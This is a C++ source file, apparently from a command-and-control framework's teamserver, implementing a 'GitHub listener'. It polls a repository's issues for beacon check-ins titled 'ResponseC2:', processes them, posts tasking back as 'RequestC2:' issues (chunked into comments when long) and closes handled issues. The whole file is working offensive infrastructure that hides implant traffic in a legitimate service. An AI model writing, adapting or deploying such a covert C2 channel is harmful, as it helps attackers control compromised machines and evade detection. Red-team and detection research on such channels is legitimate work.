#include "ListenerGithub.hpp"

using namespace std;
using namespace httplib;
using json = nlohmann::json;


ListenerGithub::ListenerGithub(const std::string& project, const std::string& token, const nlohmann::json& config)
        : Listener(project, token, ListenerGithubType)
        , m_project(project)
        , m_token(token)
{
	m_listenerHash = random_string(SizeListenerHash);

	json metadata;
    metadata["1"] = ListenerGithubType;
    metadata["2"] = project;
    metadata["3"] = token.substr(0,10);
	m_metadata = metadata.dump();

	m_isRunning=true;
	this->m_githubFetcher = std::make_unique<std::thread>(&ListenerGithub::checkGithubIssues, this);

#ifdef BUILD_TEAMSERVER
        // Logger
        std::vector<spdlog::sink_ptr> sinks;

        auto console_sink = std::make_shared<spdlog::sinks::stdout_color_sink_mt>();
        auto logLevel = resolveLogLevel(config);
        console_sink->set_level(logLevel);
    sinks.push_back(console_sink);


        auto file_sink = std::make_shared<spdlog::sinks::rotating_file_sink_mt>("logs/Listener_"+ListenerGithubType+"_"+m_listenerHash+".txt", 1024*1024*10, 3);
        file_sink->set_level(spdlog::level::trace);
        sinks.push_back(file_sink);

    m_logger = std::make_shared<spdlog::logger>("Listener_"+ListenerGithubType+"_"+m_listenerHash.substr(0,8), begin(sinks), end(sinks));
        m_logger->set_level(logLevel);
        m_logger->info("Initializing GitHub listener for project {}", project);
#endif
}


ListenerGithub::~ListenerGithub()
{
	m_isRunning=false;
	m_githubFetcher->join();

#ifdef BUILD_TEAMSERVER
        if(m_logger)
                m_logger->info("Listener Github stopped");
#endif
}


void ListenerGithub::checkGithubIssues()
{
	while(m_isRunning)
	{
		std::string url = "https://api.github.com";
		httplib::Client cli(url);

		std::string token = "token ";
		token+=m_token;

		httplib::Headers headers = {
			{ "Accept", "application/vnd.github+json" },
			{ "Authorization", token },
			{ "Cookie", "logged_in=no" }
		};

		// get list of issues
		std::string endpoint = "/repos/";
		endpoint += m_project;	
		endpoint += "/issues";	
		auto response = cli.Get(endpoint, headers);

		auto err = response.error();
		if(err!=httplib::Error::Success)
		{
#ifdef BUILD_TEAMSERVER
			m_logger->error("Http client Get {0}", httplib::to_string(err));
#endif
			continue;
		}

		if(response->status!=200 && response->status!=201)
		{
#ifdef BUILD_TEAMSERVER
			m_logger->error("Error with the ListenerGithub: {0}", response->body);
#endif
			continue;
		}

		if(!response->body.empty())
		{
			nlohmann::json my_json = json::parse(response->body);

			// for every issue in the list
			for (nlohmann::json::iterator it = my_json.begin(); it != my_json.end(); ++it)
			{				
				std::string title = (*it)["title"];
				std::string body = (*it)["body"];
				int number = (*it)["number"];
				int nbComments = (*it)["comments"];

				if(nbComments!=0)
				{
#ifdef BUILD_TEAMSERVER
					m_logger->debug("Issue with comments: {0}", std::to_string(number));
#endif
				}

				if(title.rfind("ResponseC2: ", 0) == 0)
				{	
					std::string marker = "ResponseC2: ";
					std::size_t pos = title.find(marker);
					if (pos == std::string::npos) 
					{
						continue;
					}
					pos += marker.length();
					std::string beaconHash = title.substr(pos);

					std::string res;
					HandleCheckIn(body, res);

					// generate the response for response who got content 
					if(res.size()>4)
					{
						std::string reponseTitle = "RequestC2: ";   
						reponseTitle+=beaconHash;

						// body too long need to split it
						int maxChunkSize = 65000;
						if(res.size()>=maxChunkSize)
						{
							std::vector<std::string> chunks;
							for (std::size_t i = 0; i < res.size(); i += maxChunkSize) 
							{
								chunks.push_back(res.substr(i, maxChunkSize));
							}

							nlohmann::json responseData = {
							{"title", reponseTitle},
							{"body", chunks[0]},
							};

							std::string data = responseData.dump();

							std::string contentType = "application/json";
							auto response = cli.Post(endpoint, headers, data, contentType);

							err = response.error();
							if(err!=httplib::Error::Success)
							{
#ifdef BUILD_TEAMSERVER
								m_logger->error("Http client Post Issue {0}", httplib::to_string(err));
#endif
								continue;
							}

#ifdef BUILD_TEAMSERVER
							m_logger->trace("Issue created {0}", response->status);
#endif
							
							if(response->status!=200 && response->status!=201)
							{
#ifdef BUILD_TEAMSERVER
								m_logger->error("Error with the ListenerGithub: {0}", response->body);
#endif
								continue;
							}

							nlohmann::json my_json = nlohmann::json::parse(response->body);
							int number = my_json["number"];
		
							for (std::size_t i = 1; i < chunks.size(); i++) 
							{
								nlohmann::json responseData = {
									{"body", chunks[i]},
									};

								std::string data = responseData.dump();

								std::string contentType = "application/json";
								std::string issueEndpoint = "/repos/";
								issueEndpoint += m_project;	
								issueEndpoint += "/issues/";
								issueEndpoint += std::to_string(number);	
								issueEndpoint += "/comments";
								auto response = cli.Post(issueEndpoint, headers, data, contentType);

								err = response.error();
								if(err!=httplib::Error::Success)
								{
#ifdef BUILD_TEAMSERVER
									m_logger->error("Http client Post Comments {0}", httplib::to_string(err));
#endif
									continue;
								}

								if(response->status!=200 && response->status!=201)
								{
#ifdef BUILD_TEAMSERVER
									m_logger->error("Error with the ListenerGithub: {0}", response->body);
#endif
									continue;
								}
							}
						}
						else
						{
							nlohmann::json responseData = {
							{"title", reponseTitle},
							{"body", res},
							};

							std::string data = responseData.dump();

							std::string contentType = "application/json";
							auto response = cli.Post(endpoint, headers, data, contentType);

							err = response.error();
							if(err!=httplib::Error::Success)
							{
#ifdef BUILD_TEAMSERVER
								m_logger->error("Http client Post {0}", httplib::to_string(err));
#endif
								continue;
							}

							if(response->status!=200 && response->status!=201)
							{
#ifdef BUILD_TEAMSERVER
								m_logger->error("Error with the ListenerGithub: {0}", response->body);
#endif
								continue;
							}
						}
					}

					std::string data = "{\"state\":\"closed\"}";
					std::string contentType = "application/json";

					// close the issue
					std::string issueEndpoint = "/repos/";
					issueEndpoint += m_project;	
					issueEndpoint += "/issues/";
					issueEndpoint += std::to_string(number);	
					auto response = cli.Post(issueEndpoint, headers, data, contentType);

					err = response.error();
					if(err!=httplib::Error::Success)
					{
#ifdef BUILD_TEAMSERVER
						m_logger->error("Http client Post close {0}", httplib::to_string(err));
#endif
						continue;
					}
				}
			}
		}	

		std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	}
}


int ListenerGithub::HandleCheckIn(const std::string& req, std::string& output)
{
#ifdef BUILD_TEAMSERVER
		m_logger->trace("HandleCheckIn");
#endif

	try
	{
    	bool ret = handleMessages(req, output);
	} 
	catch (const std::exception& ex) 
	{
#ifdef BUILD_TEAMSERVER
		m_logger->error("HandleCheckIn catch exception");
#endif
	} 
	catch (...) 
	{
#ifdef BUILD_TEAMSERVER
		m_logger->error("HandleCheckIn catch...");
#endif
	}

	return 0;
}
